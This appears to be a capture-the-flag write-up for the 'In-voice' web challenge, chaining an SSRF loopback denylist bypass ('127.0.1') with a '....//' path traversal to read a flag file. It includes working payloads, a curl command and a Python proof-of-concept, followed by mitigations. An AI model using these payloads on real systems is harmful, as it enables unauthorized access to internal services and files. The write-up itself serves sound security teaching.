---
layout: writeup
title: "In-voice"
challenge: "In-voice"
category: "Web"
difficulty: "Medium"
tags: [ssrf, path-traversal, lfi, filter-bypass, ssrf-denylist]
---

# Challenge Overview

**In-voice** is a web challenge featuring **InvoiceForge**, an invoice generation application. The app allows users to specify a logo URL for their invoices. This logo-fetch feature is vulnerable to **Server-Side Request Forgery (SSRF)**, which when chained with a **path traversal LFI bypass**, allows reading the flag from the server filesystem.

<div class="flag-box">KICTF{ssrf_t3mplate_tr4v3rsal_ch41n}</div>

---

## Initial Recon

The application provides an invoice creation interface where users can specify:
- Invoice details (recipient, items, amounts)
- A **logo URL** that the server fetches server-side

Key observations:
- Logo URL is fetched by the **backend** (not client-side) — classic SSRF vector
- Denylist blocks common SSRF targets (`127.0.0.1`, `localhost`, `0.0.0.0`)
- Internal service at `/templates/` accepts a `file` parameter

---

## Vulnerability / Weakness

Two chained weaknesses:

1. **SSRF Denylist Bypass (CWE-918):** The application blocks `127.0.0.1` and `localhost`, but alternative loopback representations like `127.0.1` (decimal shorthand) are not blocked.

2. **Path Traversal via Filter Bypass (CWE-22):** The internal `/templates/` endpoint sanitizes `../` using `str_replace('../','',...)`, which is trivially bypassed with overlapping payloads like `....//`.

```
┌────────────────────────────────────────────────────────┐
│                  SSRF + LFI CHAIN                      │
├────────────────────────────────────────────────────────┤
│                                                        │
│  Attacker                                              │
│    │                                                   │
│    │  logo=http://127.0.1/templates/                   │
│    │        ?file=....//....//....//....//flag.txt     │
│    ▼                                                   │
│  ┌──────────────┐                                      │
│  │ InvoiceForge │  Backend fetches logo URL            │
│  │  (Frontend)  │──────────────────────┐               │
│  └──────────────┘                      │               │
│                                        ▼               │
│                              ┌──────────────────┐      │
│                              │  Denylist Check  │      │
│                              │  127.0.0.1 ✗     │      │
│                              │  localhost  ✗     │      │
│                              │  127.0.1    ✓    │ ←bypass│
│                              └──────────────────┘      │
│                                        │               │
│                                        ▼               │
│                              ┌──────────────────┐      │
│                              │ GET /templates/  │      │
│                              │ ?file=....//...  │      │
│                              └──────────────────┘      │
│                                        │               │
│                              str_replace('../','')     │
│                              ....// → ../              │
│                                        │               │
│                                        ▼               │
│                              ┌──────────────────┐      │
│                              │ open(../../../../│      │
│                              │      flag.txt)   │      │
│                              │                  │      │
│                              │ → Returns flag   │      │
│                              └──────────────────┘      │
└────────────────────────────────────────────────────────┘
```

---

## Exploitation Strategy

1. Discover internal endpoints accessible via SSRF
2. Bypass the IP denylist using `127.0.1`
3. Identify the `file` parameter on `/templates/`
4. Bypass `str_replace` path sanitization with `....//` payloads
5. Traverse to `/flag.txt`

---

## Exploitation Walkthrough

### Step 1: SSRF Denylist Bypass

Standard loopback addresses are blocked:

```
logo=http://127.0.0.1/       → BLOCKED
logo=http://localhost/        → BLOCKED
```

Alternative loopback representations bypass the denylist:

```
logo=http://127.0.1/          → ALLOWED (resolves to 127.0.0.1)
```

### Step 2: Discover Internal `/templates/` Endpoint

```
logo=http://127.0.1/templates/
→ Response reveals template listing with file parameter
```

### Step 3: Path Traversal Filter Bypass

The `file` parameter is sanitized with:
```php
$file = str_replace('../', '', $_GET['file']);
```

This is a single-pass replacement. Overlapping payloads survive:

```
Input:   ....//
Process: str_replace removes the inner '../' → leaves '../'
Result:  ../
```

### Step 4: Final Payload

```
logo=http://127.0.1/templates/?file=....//....//....//....//flag.txt
```

```bash
curl -X POST "http://<target>/create-invoice" \
  -d 'logo=http://127.0.1/templates/?file=....//....//....//....//flag.txt'
```

Response contains the flag embedded in the invoice logo field:

```
KICTF{ssrf_t3mplate_tr4v3rsal_ch41n}
```

---

## Flag Extraction

The flag was returned inline in the server response when the path traversal resolved `/flag.txt`:

```
KICTF{ssrf_t3mplate_tr4v3rsal_ch41n}
```

---

## Proof of Concept

```python
#!/usr/bin/env python3
"""In-voice: SSRF + Path Traversal LFI Chain"""

import requests

TARGET = "http://<target>"

payload = "http://127.0.1/templates/?file=....//....//....//....//flag.txt"

r = requests.post(f"{TARGET}/create-invoice", data={"logo": payload})

if "KICTF{" in r.text:
    import re
    flag = re.search(r'KICTF\{[^}]+\}', r.text)
    print(f"[+] Flag: {flag.group()}")
else:
    print(f"[-] No flag found. Response:\n{r.text[:500]}")
```

---

## Lessons Learned

- **Denylist-based SSRF protections are fundamentally weak.** IPv4 has many equivalent representations (`127.0.1`, `0x7f000001`, `2130706433`, etc.). Allowlist-based approaches are far more robust.
- **Single-pass string replacement** for path sanitization is trivially bypassable. Recursive or regex-based sanitization (`re.sub` in a loop until stable) would prevent this class of bypass.
- The flag name in this challenge (`ssrf_template_traversal_chain`) literally describes the exploit chain — a hint to look for exactly this combination.

---

## Defensive Takeaways

| Vulnerability | Mitigation |
|---|---|
| SSRF denylist bypass | Use allowlists, not denylists. Resolve DNS first and validate the resolved IP against RFC 1918/loopback ranges |
| `str_replace` traversal bypass | Use `realpath()` and verify the resolved path starts with the allowed directory |
| Internal service exposure | Network segmentation; internal services should not be reachable from the web-facing application |
